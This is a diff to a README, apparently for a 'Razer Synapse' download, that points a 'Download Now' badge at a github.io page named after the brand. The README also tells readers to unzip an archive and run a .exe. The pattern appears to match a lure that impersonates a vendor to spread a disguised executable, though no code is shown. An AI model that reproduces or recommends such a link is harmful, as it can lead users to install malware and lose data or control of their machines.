@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://razer-synapse.github.io/.github/)
 
 ## 📸 Overview
 <img width="980" height="638" alt="razer-synapse-dashboard" src="https://github.com/user-attachments/assets/bffaa535-1b8f-4853-8165-c58ed8dcc79e" />
